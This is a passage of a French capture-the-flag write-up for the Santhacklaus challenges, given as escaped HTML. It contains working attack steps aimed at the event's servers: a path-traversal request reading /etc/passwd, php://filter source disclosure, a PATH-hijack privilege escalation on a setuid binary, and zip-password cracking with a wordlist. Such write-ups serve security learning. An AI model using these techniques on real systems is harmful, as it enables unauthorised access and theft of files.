&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sqrt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{TheFastestManAlive}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;150-archdrive-13&quot;&gt;150 ArchDrive (1/3)&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;A new company called ArchDrive recently launched a web storage service. Can you collect some informations, like administrator’s name?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;page web avec un formulaire&lt;/li&gt;
  &lt;li&gt;on essaye de reset le password&lt;/li&gt;
  &lt;li&gt;on voit https://archdrive.santhacklaus.xyz/?page=reset.php&lt;/li&gt;
  &lt;li&gt;peut-être une LFI ?&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://archdrive.santhacklaus.xyz/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;../../../../../etc/passwd
...
G0lD3N_Us3r:x:1000:1000:IMTLD&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Th1s_iS_4n_ImP0rt4nT_uS3r&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,,,:/home/G0lD3N_Us3r:/bin/bash
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{Th1s_iS_4n_ImP0rt4nT_uS3r}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;150-the-flag-grabber&quot;&gt;150 The Flag Grabber&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Can you capture the flag ?&lt;br /&gt;
Lien: https://the-flag-grabber.santhacklaus.xyz&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cursor&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;I want my flag !&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false_button&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onclick=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;message()&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;POST&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;formulaire&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;I want my flag !&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;button&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;la première &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;div&amp;gt;&lt;/code&gt; suit le curseur&lt;/li&gt;
  &lt;li&gt;la seconde n’est pas affiché car &lt;code class=&quot;highlighter-rouge&quot;&gt;visibility: hidden;&lt;/code&gt; en css.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-css highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;#formulaire&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nl&quot;&gt;visibility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hidden&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;désactiver cette regle&lt;/li&gt;
  &lt;li&gt;le bouton s’affiche, utiliser les tabulations pour se déplacer et cliquer dessus&lt;/li&gt;
  &lt;li&gt;ou supprimer la &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;div&amp;gt;&lt;/code&gt; qui suit le curseur et cliquer sur le bouton &lt;code class=&quot;highlighter-rouge&quot;&gt;I want my flag&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{J4v4scRipT_iS_W0nD3rFuL}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;150-on-the-road-again&quot;&gt;150 On the road again&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;The flag is… in the flag file :)&lt;br /&gt;
Host: 51.75.202.113&lt;br /&gt;
Protocol: SSH&lt;br /&gt;
Port: 51333&lt;br /&gt;
Username: challenger1&lt;br /&gt;
Password: challenger1&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 51333 challenger1@51.75.202.113
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt; 1 admin admin         30 Dec 25 21:10 .flag
&lt;span class=&quot;nt&quot;&gt;-r-sr-x---&lt;/span&gt; 1 admin challenger1 8640 Dec 25 21:10 ch1
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root  challenger1  117 Dec 25 21:10 ch1.c
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;ch1.c
int main&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;void&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rm /home/challenger1/.flag&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./ch1
Wow don&lt;span class=&quot;s1&quot;&gt;'t delete the flag dude

# changer le comportement de la commande rm par cat
$ mkdir /tmp/apges01
$ cd /tmp/apges01
$ cat &amp;lt;&amp;lt; end &amp;gt; rm
&amp;gt; cat /home/challenger1/.flag
&amp;gt; end
$ ls -al
-rw-r--r-- 1 challenger1 challenger1   28 Dec 25 21:12 rm
$ chmod +x ./rm
$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/games
$ export PATH=/tmp/apges01:$PATH
$ /home/challenger1/ch1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{Th1s0neW4sSymPATH3t1c2}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;150-archdrive-23&quot;&gt;150 ArchDrive (2/3)&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Well done ! Do you think it is possible now to gain access to a user account ?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;après quelques recherhces, on remarque que les base64 filter php fonctionnent&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://.../?page=php://filTer/convert.base64-encode/resource=login.php&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;dans &lt;code class=&quot;highlighter-rouge&quot;&gt;login.php&lt;/code&gt; on voit un &lt;code class=&quot;highlighter-rouge&quot;&gt;myfiles.php&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://.../?page=php://filTer/convert.base64-encode/resource=myfiles.php&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;on a une liste de fichiers qu’on peut récupérer&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# exemple de ressource&lt;/span&gt;
&amp;lt;li&amp;gt;&amp;lt;a &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;txt2&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;21f64da1e5792c8295b964d159a14491/lol.jpg&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;lol.jpg&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;

&lt;span class=&quot;c&quot;&gt;# lien associé&lt;/span&gt;
https://archdrive.santhacklaus.xyz/index.php?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;pHp://FilTer/convert.base64-encode/resource&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;+ le href précédent
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# recup.zip est protégé par un mdp&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;fcrackzip &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; ./rockyou.txt recup.zip
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;password.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{F1nd_Y0uR_W4y}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;200-pong&quot;&gt;200 Pong&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Our SIEM got alerted by a surprisingly high number of ICMP requests on the network. Investigate.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;fichier &lt;code class=&quot;highlighter-rouge&quot;&gt;.pcapng&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;rempli avec un grand nombre de paquets ICMP&lt;/li&gt;
  &lt;li&gt;png ? dans le l’extension&lt;/li&gt;
  &lt;li&gt;data dans les packets ICMP ? oui&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tshark &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; ./challenge.pcapng &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; fields &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; data

&lt;span class=&quot;c&quot;&gt;# on remarque que les echo request et echo reply ont les même data&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# il faut donc eviter les doublons&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tshark &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; ./challenge.pcapng &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; fields &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; data | &lt;span class=&quot;nb&quot;&gt;uniq&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# les données sont en base16, il faut les transformer en ascii&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# on les passe en base64 puis on decode&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;shark &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; ./challenge.pcapng &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; fields &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; data | &lt;span class=&quot;nb&quot;&gt;uniq&lt;/span&gt; |  xxd &lt;span class=&quot;nt&quot;&gt;-ps&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; res.png

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file res.png
test.png: PNG image data, 487 x 272, 8-bit/color RGBA, non-interlaced
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{4_s1mpl3_3xfilTR4t1oN_tECHNIQUe}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;200-qrencoded&quot;&gt;200 QREncoded&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;QRCoding is the new black.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;dossier rempli de QRcode de 0 à 843&lt;/li&gt;
  &lt;li&gt;lire toutes les data et les regrouper dans un fichier ?&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;PIL&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pyzbar.pyzbar&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;f_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'part_'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;f_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'.png'&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;844&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f_end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'RGBA'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;my_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'res'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'wb'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;my_file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;my_file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file res
challenge/res: JPEG image data, JFIF standard 1.01, resolution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DPI&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, density 300x300
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{qrCODES_R_3v1l}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;200-love&quot;&gt;200 love&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;love invitation.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file key.pub
key.pub: PGP public key block
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;clé PGP ? non, beaucoup trop longue !&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# decode base64&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 4,1717p ./key.pub | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; key.b64

&lt;span class=&quot;c&quot;&gt;# on obtient une image SVG&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file key.b64
key.b64: SVG Scalable Vector Graphics image

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;key.b64 key.svg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;on l’ouvre et &lt;code class=&quot;highlighter-rouge&quot;&gt;i love you&lt;/code&gt;, pas de flag&lt;/li&gt;
  &lt;li&gt;on regarde le svg&lt;/li&gt;
  &lt;li&gt;on remarque que les couleurs sont soit noirs soit blanches&lt;/li&gt;
  &lt;li&gt;et que opacity = 0 ? le modifier à 1 ? à 0,5 (tous les modifiers)&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# en changeant toutes les valeurs de l'opacity à 0.5&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/opacity=&quot;0&quot;/opacity=&quot;1&quot;/g'&lt;/span&gt; ./key.svg | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/opacity=&quot;1&quot;/opacity=&quot;0.5&quot;/g'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; res.svg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{y0uR_N0t_R34dy_f0r_Th1s}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;200-srht&quot;&gt;200 SRHT&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;We have spotted a suspicious website recently published. We don’t know yet if this site is a bad joke or if it belongs to a real terrorist entity. No member of our team has so far been able to connect. You have been asked to audit and infiltrate this mysterious website. Good luck !&lt;br /&gt;
Lien: https://srht.santhacklaus.xyz&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;site russe bizarre&lt;/li&gt;
  &lt;li&gt;on remarque un cookie “connexion” qui est toujours le même, avec valeur bizarre&lt;/li&gt;
  &lt;li&gt;avec burp on remarque qu’il nous renvoi toujours le même cookie&lt;/li&gt;
  &lt;li&gt;et si on changait le cookie ?&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# requête classique avec cookie&lt;/span&gt;
GET / HTTP/1.1
Host: srht.santhacklaus.xyz
